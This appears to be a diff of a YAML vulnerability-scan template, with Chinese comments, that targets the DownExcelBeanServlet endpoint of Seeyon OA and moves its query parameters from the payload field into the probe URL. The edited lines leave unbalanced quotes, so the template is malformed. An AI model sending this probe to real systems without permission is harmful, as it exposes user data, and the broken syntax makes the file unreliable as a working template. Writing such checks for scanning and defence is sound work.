@@ -8,11 +8,11 @@
 
 #漏洞的位置
 - url:
-  - url : "/yyoa/DownExcelBeanServlet"
+  - url : "/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0""
 
 #payload
 - payload:
-  - payload: "contenttype=username&contentvalue=&state=1&per_id=0"
+  - payload: "isNone
 
 #response包里状态码
 - status:
